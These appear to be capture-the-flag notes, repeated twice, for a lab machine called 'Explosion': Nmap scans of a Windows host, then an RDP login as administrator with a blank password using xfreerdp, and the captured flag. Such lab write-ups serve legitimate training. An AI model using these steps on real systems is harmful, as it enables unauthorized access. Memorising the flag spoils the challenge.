# Explosion 

TARGET MACHINE IP ADDRESS
10.129.55.66
## Nmap - Initial

```
nmap 10.129.55.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 21:03 EST
Nmap scan report for 10.129.55.66
Host is up (0.050s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

## Nmap - Details

```
nmap -sS -sV -sC -O -T4 -p 135,139,445,3389 10.129.55.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 21:05 EST
Nmap scan report for 10.129.55.66
Host is up (0.050s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2024-02-20T01:59:50
|_Not valid after:  2024-08-21T01:59:50
|_ssl-date: 2024-02-21T02:05:36+00:00; +5s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-21T02:05:25+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-21T02:05:25
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds
```

## Pwn
- Trial and error since the question said there was no password. 
- It's a Windows box so "root" was probably not it. 
- Windows "root" is "administrator," so I tried that... 
```
xfreerdp /u:administrator /p:"" /v:10.129.55.66

# Flag: 951fa96d7830c451b536be5a6be008a0
```

# Explosion 

TARGET MACHINE IP ADDRESS
10.129.55.66
## Nmap - Initial

```
nmap 10.129.55.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 21:03 EST
Nmap scan report for 10.129.55.66
Host is up (0.050s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

## Nmap - Details

```
nmap -sS -sV -sC -O -T4 -p 135,139,445,3389 10.129.55.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 21:05 EST
Nmap scan report for 10.129.55.66
Host is up (0.050s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2024-02-20T01:59:50
|_Not valid after:  2024-08-21T01:59:50
|_ssl-date: 2024-02-21T02:05:36+00:00; +5s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-21T02:05:25+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-21T02:05:25
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds
```

## Pwn
- Trial and error since the question said there was no password. 
- It's a Windows box so "root" was probably not it. 
- Windows "root" is "administrator," so I tried that... 
```
xfreerdp /u:administrator /p:"" /v:10.129.55.66

# Flag: 951fa96d7830c451b536be5a6be008a0
```

![[Pasted image 20240220202102.png]]
